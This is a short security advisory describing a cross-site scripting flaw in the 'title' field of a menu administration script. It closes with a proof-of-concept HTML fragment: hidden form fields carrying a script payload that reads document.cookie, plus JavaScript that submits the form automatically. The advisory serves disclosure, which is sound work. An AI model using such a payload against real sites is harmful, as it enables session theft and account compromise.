The vulnerability exists due to failure in the "modules/Menu/MenuModuleAdmin.php" script to properly sanitize user-supplied input in "title" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<input type="hidden" name="title" value='lotus"><script>alert(document.cookie)</script>'>
<input type="hidden" name="external" value="http://host">
</form>
<script>
document.main.submit();
</script>
